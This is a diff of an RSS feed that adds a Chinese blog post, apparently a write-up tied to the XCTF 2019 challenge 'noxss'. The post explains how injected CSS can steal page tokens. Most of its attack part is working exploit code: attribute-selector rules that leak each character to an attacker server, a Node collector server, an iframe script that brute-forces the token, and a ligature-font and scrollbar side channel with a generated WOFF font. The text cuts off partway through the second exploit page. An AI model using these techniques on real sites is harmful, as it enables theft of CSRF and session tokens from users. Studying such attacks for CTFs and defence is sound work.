@@ -5,8 +5,725 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Thu, 05 Sep 2019 13:25:41 +0800</lastBuildDate>
+    <lastBuildDate>Sun, 03 Nov 2019 20:08:43 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>From CSS to XSS</title>
+      <link>https://syang-ng.github.io/2019/11/from-css-to-xss/</link>
+      <pubDate>Sun, 03 Nov 2019 20:08:43 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/11/from-css-to-xss/</guid>
+      <description>
+
+&lt;p&gt;用 CSS 泄露信息是 XCTF 2019 final 一道题目 noxss 的考点，又学到了（留下了没有技术的泪水）&lt;/p&gt;
+
+&lt;h2 id=&#34;stealing-data-in-a-great-way-how-to-use-css-to-attack-webapplication&#34;&gt;Stealing data in a great way - how to use CSS to attack webapplication&lt;/h2&gt;
+
+&lt;p&gt;以下段落是我对 &lt;a href=&#34;https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Stealing data in a great way - how to use CSS to attack webapplication&lt;/a&gt; 这篇文章的总结，主要分为两部分，一：利用 css 从 html 标签的属性中窃取 token；二：利用 css 直接从网站内容中提取 token。&lt;/p&gt;
+
+&lt;p&gt;我们利用以下页面作为攻击的 demo：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;?php
+$token1 = md5($_SERVER[&#39;HTTP_USER_AGENT&#39;]);
+$token2 = md5($token1);
+?&amp;gt;
+&amp;lt;!doctype html&amp;gt;&amp;lt;meta charset=utf-8&amp;gt;
+&amp;lt;input type=hidden value=&amp;lt;?=$token1 ?&amp;gt;&amp;gt;
+&amp;lt;script&amp;gt;
+	var TOKEN = &amp;quot;&amp;lt;?=$token2 ?&amp;gt;&amp;quot;;
+&amp;lt;/script&amp;gt;
+
+&amp;lt;style&amp;gt;
+	&amp;lt;?=preg_replace(&#39;#&amp;lt;/style#i&#39;, &#39;#&#39;, $_GET[&#39;css&#39;]) ?&amp;gt;
+&amp;lt;/style&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到我们生成了两个 token，分别是 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; 标签的属性和 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签的内容，然后我们将通过 &lt;code&gt;?css=&lt;/code&gt; 这个注入点注入 css 代码来窃取相应的 token。&lt;/p&gt;
+
+&lt;h3 id=&#34;从标签属性中获得-token&#34;&gt;从标签属性中获得 token&lt;/h3&gt;
+
+&lt;p&gt;第一步，我们先考虑从 input 标签窃取 token，这里可以考虑使用 CSS 选择器来辅助我们达成这一目的。简单介绍下 CSS 选择器，它其实是一种匹配模式，用于选择需要添加样式的元素，我们可以利用它来匹配含有特定 class、id、标签或者其它任意属性。下面是一些 CSS 选择器的基本例子：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;CSS
+/* 匹配整个 body 标签 */
+body { }
+
+/* 设置类名为 test 的标签的 css 属性 */
+.test { }
+
+/* 设置 id 为 test2 的标签的 css 属性 */
+#test2 { }
+
+/* 对 value 值为 &amp;quot;abc&amp;quot; 的 input 标签设置 css 属性 */
+input[value=&amp;quot;abc&amp;quot;] { }
+
+/* 对 value 值以 &amp;quot;a&amp;quot; 开头的 input 标签设置 css 属性 */
+input[value^=&amp;quot;a&amp;quot;] { }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由于浏览器仅会在 CSS 规则匹配的时候触发 CSS 样式的修改，因此可以利用例子里的最后一条规则，通过属性值开头的字符来进行对 token 进行侧信道：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;input[value^=&amp;quot;0&amp;quot;] {
+	background: url(http://your_server/0);
+}
+input[value^=&amp;quot;1&amp;quot;] {
+	background: url(http://your_server/1);
+}
+input[value^=&amp;quot;2&amp;quot;] {
+	background: url(http://your_server/2);
+}
+...
+input[value^=&amp;quot;e&amp;quot;] {
+	background: url(http://your_server/e);
+}
+input[value^=&amp;quot;f&amp;quot;] {
+	background: url(http://your_server/f);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据以上定义的规则，如果 token 以字符  &lt;code&gt;a&lt;/code&gt; 开头的话，会也仅会满足 &lt;code&gt;input[value^=&amp;quot;a&amp;quot;] { background: url(http://your_server/a); }&lt;/code&gt; 规则，进而向服务器发出 &lt;code&gt;http://your_server/a&lt;/code&gt; 的请求。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/token.png&#34; alt=&#34;token&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;现在我们思考如何将上述过程自动化完成，毋庸置疑，完成以上过程大致需要如下几个步骤：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;在 HTML 页面使用 JavaScript 自动生成 exp&lt;/li&gt;
+&lt;li&gt;一台 server 能接收并存储攻击获得的现有 token&lt;/li&gt;
+&lt;li&gt;浏览器能向 server 请求并获得已经获得的 token&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;然后我们考虑以 node 作为我们服务器的后端，然后相应的 &lt;code&gt;package.json&lt;/code&gt; 如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
+  &amp;quot;name&amp;quot;: &amp;quot;css-attack-1&amp;quot;,
+  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
+  &amp;quot;description&amp;quot;: &amp;quot;&amp;quot;,
+  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
+  &amp;quot;dependencies&amp;quot;: {
+    &amp;quot;express&amp;quot;: &amp;quot;^4.15.5&amp;quot;,
+    &amp;quot;js-cookie&amp;quot;: &amp;quot;^2.1.4&amp;quot;
+  },
+  &amp;quot;devDependencies&amp;quot;: {},
+  &amp;quot;author&amp;quot;: &amp;quot;&amp;quot;,
+  &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;服务端以 exprss 框架来处理 http 请求，然后用 js-cookie 库来存储 cookie。&lt;/p&gt;
+
+&lt;p&gt;然后创建 &lt;code&gt;index.js&lt;/code&gt; ：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// index.js
+const express = require(&#39;express&#39;);
+const app = express();
+// 关闭 express 默认开启的 etag
+app.disable(&#39;etag&#39;);
+ 
+const PORT = 3000;
+ 
+app.get(&#39;/token/:token&#39;, (req, res) =&amp;gt; {
+	const { token } = req.params;
+  // 在 cookie 中保存已经获得的 flag
+	res.cookie(&#39;token&#39;, token);
+	res.send(&#39;&#39;);
+});
+ 
+app.get(&#39;/cookie.js&#39;, (req, res) =&amp;gt; {
+	res.sendFile(&#39;js.cookie.js&#39;, {
+		root: &#39;./node_modules/js-cookie/src/&#39;
+	});
+});
+ 
+app.get(&#39;/index.html&#39;, (req, res) =&amp;gt; {
+	res.sendFile(&#39;index.html&#39;, {
+		root: &#39;.&#39;
+	});
+});
+ 
+app.listen(PORT, () =&amp;gt; {
+	console.log(`Listening on ${PORT}...`);
+})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;server 主要有以下几个功能：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;静态资源的提供：&lt;code&gt;index.html&lt;/code&gt; /  &lt;code&gt;cookie.js&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;接受 &lt;code&gt;/token/:token&lt;/code&gt; 的 GET 请求并将得到的 token 写入 cookie&lt;br /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;然后是关键的 &lt;code&gt;index.html&lt;/code&gt; 部分，其会通过创建一个 iframe 的方式逐位爆破 token 并将之发送到服务器端：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!doctype html&amp;gt;&amp;lt;meta charset=utf-8&amp;gt;
+&amp;lt;script src=&amp;quot;./cookie.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;big id=token&amp;gt;&amp;lt;/big&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;iframe id=iframe&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;script&amp;gt;
+	(async function() {
+		const EXPECTED_TOKEN_LENGTH = 32;
+		const ALPHABET = Array.from(&amp;quot;0123456789abcdef&amp;quot;);
+    const iframe = document.getElementById(&#39;iframe&#39;);
+		let extractedToken = &#39;&#39;;
+		// 逐位爆破 token
+		while (extractedToken.length &amp;lt; EXPECTED_TOKEN_LENGTH) {
+			clearTokenCookie();
+			createIframeWithCss();
+			extractedToken = await getTokenFromCookie();
+			// 将获得的 token 写到页面处
+			document.getElementById(&#39;token&#39;).textContent = extractedToken;
+		}
+		// 读取 cookie
+		function getTokenFromCookie() {
+			return new Promise(resolve =&amp;gt; {
+				const interval = setInterval(function() {
+					const token = Cookies.get(&#39;token&#39;);
+					if (token) {
+						clearInterval(interval);
+						resolve(token);
+					}
+				}, 50);
+			});
+		}
+		// 清除现有 cookie
+		function clearTokenCookie() {
+			Cookies.remove(&#39;token&#39;);
+		}
+		// 生成 exp
+    function generateCSS() {
+      let css = &#39;&#39;;
+      for (let char of ALPHABET) {
+        css += `input[value^=&amp;quot;${extractedToken}${char}&amp;quot;] {
+background: url(http://192.168.1.180:3000/token/${extractedToken}${char})
+}`;
+      }      
+
+      return css;
+    }
+    // 创建 iframe
+		function createIframeWithCss() {
+			iframe.src = &#39;http://192.168.1.180/demo.php?css=&#39; + encodeURIComponent(generateCSS());
+		}
+	})();
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;获得 token1:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/token1.png&#34; alt=&#34;token1&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;简单总结：&lt;/p&gt;
+
+&lt;p&gt;如果存在相应对 CSS 注入点，我们可以利用以下规则获得 html 标签中的属性值：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Css&#34;&gt;element[attribute^=&amp;quot;beginning&amp;quot;] {/ * ... * /}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2018 的 SECCON 的 web 题 Ghostkingdom 就考察了这种攻击，具体可以参考我写的题解：&lt;a href=&#34;https://blog.syang.xyz/2018/10/seccon-2018-web-ghostkingdom-shooter/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;SECCON 2018 - Web Ghostkingdom / Shooter 题解&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;extracting-the-token-from-the-website-content&#34;&gt;Extracting the token from the website content&lt;/h3&gt;
+
+&lt;p&gt;上节介绍的攻击方式仅仅只能获得标签的属性值，但是不能对标签本身中包含的文本执行相同的操作（CSS 没有这种类型的选择器）， 而 token2 以文本形式存在在 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签中，参考以下的例子：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+	var TOKEN = &amp;quot;cd5fe9861e3ac3ddd1f6ebf0162c6a0e&amp;quot;;
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;下面就要思考这样一个问题，我们如何获得相应的 token？首先我们需要验证 CSS 对 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 是有影响能力的，所以尝试对 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签编写 CSS 规则 &lt;code&gt;script {display: block; color: red;}&lt;/code&gt;，可以看到很明显的效果：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/css-script.png&#34; alt=&#34;css =&amp;gt; sscript&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接下来我们需要思考一个问题，我们如何利用 CSS 来获得第二个 token？&lt;/p&gt;
+
+&lt;p&gt;这里介绍一种使用结合字体“连字”和滚动条样式进行侧信道的方式。具体关于连字的介绍，这里不再赘述，可以参看这篇文章：&lt;a href=&#34;http://www.mzh.ren/ligature-intro.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;连字简述&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;我们创建如下字体，其中 &amp;ldquo;a-z&amp;rdquo; 的宽度为 0(&lt;code&gt;horiz-adv-x=&amp;quot;0&amp;quot;&lt;/code&gt;)，但连字 &amp;ldquo;cssdemo&amp;rdquo; 宽度为 8000：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;svg&amp;gt;
+  &amp;lt;defs&amp;gt;
+    &amp;lt;font id=&amp;quot;hack&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot;&amp;gt;
+      &amp;lt;font-face font-family=&amp;quot;hack&amp;quot; units-per-em=&amp;quot;1000&amp;quot; /&amp;gt;
+      &amp;lt;missing-glyph /&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;a&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;b&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;c&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;d&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;e&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;f&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;g&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;h&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;i&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;j&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;k&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;l&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;m&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;n&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;o&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;p&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;q&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;r&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;s&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;t&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;u&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;v&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;w&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;x&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;y&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;z&amp;quot; horiz-adv-x=&amp;quot;0&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+      &amp;lt;glyph unicode=&amp;quot;cssdemo&amp;quot; horiz-adv-x=&amp;quot;8000&amp;quot; d=&amp;quot;M1 0z&amp;quot;/&amp;gt;
+    &amp;lt;/font&amp;gt;
+  &amp;lt;/defs&amp;gt;
+&amp;lt;/svg&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由于浏览器不支持 SVG 格式的字体，但该格式的字体更直观更容易修改，因此这里我们使用 &lt;code&gt;fontforge&lt;/code&gt; 将 SVG 格式转化为浏览器支持的 WOFF 格式。&lt;/p&gt;
+
+&lt;p&gt;编写如下转换脚本：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-fontforge&#34;&gt;#!/usr/bin/fontforge
+Open($1)
+Generate($1:r + &amp;quot;.woff&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;执行脚本，得到 &lt;code&gt;demo.woff&lt;/code&gt; 文件：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ fontforge script.fontforge demo.svg
+# convert demo.svg to demo.woff
+$ ls
+demo.svg  demo.woff  script.fontforge
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后我们来看一下该字体能带来什么效果，编写一个测试用的 html 文件：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;style&amp;gt;
+@font-face {
+    font-family: &amp;quot;hack&amp;quot;;
+    src: url(data:application/x-font-woff;base64,d09GRk9UVE8AAASIAA0AAAAABrQAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABDRkYgAAABMAAAAMQAAAET4n+DzUZGVE0AAAH0AAAAGgAAAByADBLyR0RFRgAAAhAAAAAiAAAAJgBmACVHUE9TAAACNAAAACAAAAAgbJF0j0dTVUIAAAJUAAAASgAAAFrZXdxXT1MvMgAAAqAAAABEAAAAYFXjXMBjbWFwAAAC5AAAAFgAAAFKYztWsWhlYWQAAAM8AAAAKgAAADYS7LEPaGhlYQAAA2gAAAAbAAAAJAN8QZVobXR4AAADhAAAABEAAABwRigAAG1heHAAAAOYAAAABgAAAAYAHFAAbmFtZQAAA6AAAADaAAABYiJRBKtwb3N0AAAEfAAAAAwAAAAgAAMAAHicY2RgYWFgZGRkzUhMzmZgZGJgZND4IcP0Q5b5hwRLNw9zNw9LNxCwyjDE8sswMAjIMEwRlGHglGHkEmJgBqnmYxBiEEuOLwbClPjU+Nz4fJBJYNOAwInBmcGFwZXBjcGdwYPBk8GLwZvBh8GXwY/BnyGAIZAhiCGYIYQhlCGMIZwhgiGSIYohmrGdQQboHg5uPkERcSlZBWU1TR19I1MLaztHF3cv34DgcJlDwnw9YtRE34C4W0TG8apoNw8XANH8N4h4nGNgYGBkAIIztovOg+ibzy0EYTQAS0sGjgAAeJxjYGRgYOADYjkGEGACQkYGKSCWBkImBhawGAMACm8AjAAAAAEAAAAKABwAHgABbGF0bgAIAAQAAAAA//8AAAAAAAB4nC2JSwqAMBQD5+ErloK46FLxBF6qqyIUV96/xg8hhMxgQGJjx1q5TiIuQu88xtpRixjfk/N3o7r+6yyMZMUJTMxixnADjk0GZwAAeJxjYGb8wjiBgZWBg6mLaQ8DA0MPhGZ8wGDIyMTAwMTAyswAA4wMSCAgzTWFwYEhkaGKWeG/BUMUhhoFIGQHAFrKCk14nGNgYGBmgGAZBkYGEHAB8hjBfBYGDSDNBqQZGZiArKr//8EqEkH0/wVQ9UDAyMaA4NAKMDIxs7CysXNwcnHz8PLxCwgKCYuIiolLSErR2maiAAC3ZQifeJxjYGRgYABijuXb7sTz23xl4GZ+ARRhuPncQhSZhgIOBiYQBQAt1wj9AAB4nGNgZGBgVvhvwRDl5MAAAYwMqEAGAD9gAlUAeJxjfsFAN+DkwMAAAGggAW4AAAAAAFAAABwAAHicXZA7TgMxEIa/TTbhKejS4o5qV/ZKKUhFlQNQpF9F1iYi2pWc5BLUCIljcABqrsXvMDTxyJ5vRv88ZOCWDwryKSi5Nh5xwYPxGMfWuJS9G0+44ct4qvyPlEV5pczlqSrziDvujcc882hcSvNmPGHGp/FU+W82tKx5hU271vtCpOPITumkMHbHXStYMtBzOPkkRdSiDTVefqH73+YvmlMRZJU0Xv5JDYb+sBxSF11Te7dweZzcvAqhanyQ4myTlWYk9vqOPNmpS57GKqb9duhdqP15yS9r5S4DAAB4nGNgZsALAAB9AAQ=);
+}    
+ 
+span {
+    background: lightblue;
+    font-family: &amp;quot;hack&amp;quot;;
+}
+
+body {
+    white-space: nowrap;
+}
+body::-webkit-scrollbar {
+    background: blue;
+}
+body::-webkit-scrollbar:horizontal {
+    background: url(http://127.0.0.1/success);
+}
+&amp;lt;/style&amp;gt;
+&amp;lt;input name=i oninput=span.textContent=this.value&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;span id=span&amp;gt;a&amp;lt;/span&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到当触发滚动条样式生效时，成功触发了请求：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/test.png&#34; alt=&#34;test&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由此我们的思路非常明确：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;生成特定格式的字体，当我们想要猜测的内容恰好匹配字体的连字时，由于该连字的宽度非常大，会让页面滚动&lt;/li&gt;
+&lt;li&gt;设置滚动条样式，当触发页面滚动时带出信息&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;既然验证了可行性，下一步就是如何利用字体进行侧信道攻击，继续修改之前的服务端，首先添加几个库：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
+  &amp;quot;name&amp;quot;: &amp;quot;css-attack-2&amp;quot;,
+  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
+  &amp;quot;description&amp;quot;: &amp;quot;&amp;quot;,
+  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
+  &amp;quot;scripts&amp;quot;: {
+    &amp;quot;test&amp;quot;: &amp;quot;echo \&amp;quot;Error: no test specified\&amp;quot; &amp;amp;&amp;amp; exit 1&amp;quot;
+  },
+  &amp;quot;author&amp;quot;: &amp;quot;&amp;quot;,
+  &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot;,
+  &amp;quot;dependencies&amp;quot;: {
+    &amp;quot;express&amp;quot;: &amp;quot;^4.15.5&amp;quot;,
+    &amp;quot;js-cookie&amp;quot;: &amp;quot;^2.1.4&amp;quot;,
+    &amp;quot;js2xmlparser&amp;quot;: &amp;quot;^3.0.0&amp;quot;,
+    &amp;quot;rimraf&amp;quot;: &amp;quot;^2.6.2&amp;quot;,
+    &amp;quot;tmp&amp;quot;: &amp;quot;0.0.33&amp;quot;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里添加几个库的目的是方便对 tmp 文件夹进行操作，由于我们需要不断地调用 &lt;code&gt;fontforge&lt;/code&gt; 来创建字体，因此对文件的读写操作非常频繁，所有需要方便地对临时文件进行操作。然后修改 &lt;code&gt;index.js&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const express = require(&#39;express&#39;);
+const app = express();
+// 关闭 express 默认开启的 etag
+app.disable(&#39;etag&#39;);
+ 
+const PORT = 3001;
+const js2xmlparser = require(&#39;js2xmlparser&#39;);
+const fs = require(&#39;fs&#39;);
+const tmp = require(&#39;tmp&#39;);
+const rimraf = require(&#39;rimraf&#39;);
+const child_process = require(&#39;child_process&#39;);
+ 
+// 为给定的前缀生成字体
+// 第二个参数是待选的字符集
+function createFont(prefix, charsToLigature) {
+    let font = {
+        &amp;quot;defs&amp;quot;: {
+            &amp;quot;font&amp;quot;: {
+                &amp;quot;@&amp;quot;: {
+                    &amp;quot;id&amp;quot;: &amp;quot;hack&amp;quot;,
+                    &amp;quot;horiz-adv-x&amp;quot;: &amp;quot;0&amp;quot;
+                },
+                &amp;quot;font-face&amp;quot;: {
+                    &amp;quot;@&amp;quot;: {
+                        &amp;quot;font-family&amp;quot;: &amp;quot;hack&amp;quot;,
+                        &amp;quot;units-per-em&amp;quot;: &amp;quot;1000&amp;quot;
+                    }
+                },
+                &amp;quot;glyph&amp;quot;: []
+            }
+        }
+    };
+    
+    // 默认情况下所有字符为 0 宽度
+    let glyphs = font.defs.font.glyph;
+    for (let c = 0x20; c &amp;lt;= 0x7e; c += 1) {
+        const glyph = {
+            &amp;quot;@&amp;quot;: {
+                &amp;quot;unicode&amp;quot;: String.fromCharCode(c),
+                &amp;quot;horiz-adv-x&amp;quot;: &amp;quot;0&amp;quot;,
+                &amp;quot;d&amp;quot;: &amp;quot;M1 0z&amp;quot;,
+            }
+        };
+        glyphs.push(glyph);
+    }
+    
+    // 待连字具有非常大的宽度，这里直接设为 10000
+    charsToLigature.forEach(c =&amp;gt; {
+        const glyph = {
+            &amp;quot;@&amp;quot;: {
+                &amp;quot;unicode&amp;quot;: prefix + c,
+                &amp;quot;horiz-adv-x&amp;quot;: &amp;quot;10000&amp;quot;,
+                &amp;quot;d&amp;quot;: &amp;quot;M1 0z&amp;quot;,
+            }
+        }
+        glyphs.push(glyph);
+    });
+    
+    // 解析 svg 文件
+    const xml = js2xmlparser.parse(&amp;quot;svg&amp;quot;, font);
+    
+    // 将 svg 文件转换为 woff 格式
+    const tmpobj = tmp.dirSync();
+    fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
+    child_process.spawnSync(&amp;quot;/usr/bin/fontforge&amp;quot;, [
+        `${__dirname}/script.fontforge`,
+        `${tmpobj.name}/font.svg`
+    ]);
+ 
+    const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);
+    // 删除临时目录
+    rimraf.sync(tmpobj.name);
+ 
+    // 返回字体.
+    return woff;
+}
+ 
+// 接受参数，并生成特定字体
+app.get(&amp;quot;/font/:prefix/:charsToLigature&amp;quot;, (req, res) =&amp;gt; {
+    const { prefix, charsToLigature } = req.params;
+    
+    // 这里确保字体在缓存中
+    res.set({
+        &#39;Cache-Control&#39;: &#39;public, max-age=600&#39;,
+        &#39;Content-Type&#39;: &#39;application/font-woff&#39;,
+        &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39;,
+    });
+    
+    res.send(createFont(prefix, Array.from(charsToLigature)));  
+});
+ 
+// 保存接受到的 token
+app.get(&amp;quot;/token/:chars&amp;quot;, function(req, res) {
+    console.log(req.params.chars);
+    res.cookie(&#39;token&#39;, req.params.chars);
+    res.set(&#39;Set-Cookie&#39;, `token=${encodeURIComponent(req.params.chars)}; Path=/`);
+    res.send();
+});
+ 
+app.get(&#39;/cookie.js&#39;, (req, res) =&amp;gt; {
+	res.sendFile(&#39;js.cookie.js&#39;, {
+		root: &#39;./node_modules/js-cookie/src/&#39;
+	});
+});
+ 
+app.get(&#39;/index.html&#39;, (req, res) =&amp;gt; {
+	res.sendFile(&#39;index.html&#39;, {
+		root: &#39;.&#39;
+	});
+});
+ 
+app.listen(PORT, () =&amp;gt; {
+	console.log(`Listening on ${PORT}...`);
+})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后修改第一部分的 &lt;code&gt;index.html&lt;/code&gt;（这里不使用原文例子是因为其使用了包括二分在内的种种爆破技巧，难以理解）&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!doctype html&amp;gt;&amp;lt;meta charset=utf-8&amp;gt;
+&amp;lt;script src=&amp;quot;./cookie.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
